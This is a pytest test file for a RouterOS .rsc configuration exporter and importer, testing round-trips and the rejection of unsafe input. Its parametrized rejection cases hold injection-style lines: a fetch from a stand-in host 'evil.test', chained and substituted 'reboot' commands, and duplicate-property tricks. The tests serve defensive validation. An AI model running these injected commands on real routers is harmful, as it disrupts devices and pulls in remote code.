import pytest

from app.demo import demo_config
from app.models import Configuration
from app.rsc import HEADER, ScriptError, export_rsc, import_rsc


def test_rsc_round_trip_preserves_every_section_and_rule_order() -> None:
    config = demo_config()
    config.web_domain = "router.example.com"
    config.rules[0].comment = 'Unicode: сеть; $x [run] "quoted" \\ path\nline'
    text = export_rsc(config)
    assert text.startswith(HEADER)
    assert "/ip firewall nat add " in text
    assert "enabled=true" in text
    assert import_rsc(text) == config
    assert import_rsc(export_rsc(Configuration())) == Configuration()


@pytest.mark.parametrize(
    "command",
    [
        "/system reboot",
        ':execute [/tool fetch url="http://evil.test"]',
        '/ip firewall nat add name="x"; reboot',
        "/system web set domain=$(reboot)",
        '/system web set domain="x.test" domain="other.test"',
        '/system web set domain="x.test"\n/system web set domain="other.test"',
        '/ip firewall nat add unexpected="x"',
    ],
)
def test_unknown_commands_and_ambiguous_properties_are_rejected(command: str) -> None:
    with pytest.raises(ScriptError):
        import_rsc(HEADER + "\n" + command)


def test_rsc_error_includes_line_without_echoing_values() -> None:
    with pytest.raises(ScriptError, match="Строка 3") as error:
        import_rsc(HEADER + '\n# comment\n/system web set domain="PRIVATE-BAD-VALUE')
    assert "PRIVATE-BAD-VALUE" not in str(error.value)
    with pytest.raises(ScriptError, match="RouterOS"):
        import_rsc("/ip firewall nat add chain=dstnat")
